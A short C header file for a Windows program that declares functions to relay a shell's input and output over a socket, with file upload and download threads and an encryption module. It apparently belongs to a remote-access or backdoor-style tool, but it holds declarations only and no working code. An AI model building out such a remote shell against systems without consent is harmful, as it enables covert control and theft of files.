#ifndef PIPES_H
#define PIPES_H

#include "helper.h"
#include "start.h" 
#include "encryption.h"

//data struct for shell thread args
typedef struct threadData_Shell {
	HANDLE OUT_Rd;
	HANDLE IN_Wr;
	HANDLE hParentThread;
}MYData_S, *PData_S;

//data struct for upload and download thread args
typedef struct threadData_uploads {
	FILE* fpointer;

}MYData_U, * PData_U;

//download functions
DWORD WINAPI downloadPipe(LPVOID LPparam);
void downloadFile(FILE * pfile);

//upload functions
DWORD WINAPI uploadPipe(LPVOID lPparam);
void uploadFile(FILE * file_OUT_Rd);

//shell functions
DWORD WINAPI shellPipe(LPVOID lPparam);
void writeSocket(HANDLE ChildStd_OUT_Rd);
void readSocket(HANDLE ChildStd_IN_Wr);

#endif